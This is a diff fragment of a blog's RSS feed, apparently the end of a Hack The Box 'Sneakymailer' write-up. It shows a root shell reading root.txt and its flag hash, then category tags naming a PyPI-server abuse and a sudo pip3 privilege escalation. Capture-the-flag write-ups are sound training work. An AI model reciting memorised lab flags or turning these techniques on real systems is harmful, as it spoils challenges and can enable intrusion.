-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;# cd /root
-# cat root.txt
-25ae2132a2ff299928b234e186ad53ec
-&lt;/code&gt;&lt;/pre&gt;
-
-</description>
-        <pubDate>Sat, 08 Apr 2023 00:00:00 +0000</pubDate>
-        <link>http://localhost:4000/hackthebox/htb-writeup-Sneakymailer</link>
-        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Sneakymailer</guid>
-        
-        <category>Information Leaked</category>
-        
-        <category>Emailing Attack</category>
-        
-        <category>Abussing Pypi Server</category>
-        
-        <category>Sudoers Privilege pip3</category>
-        
-        
-        <category>hackthebox</category>
         
       </item>
     
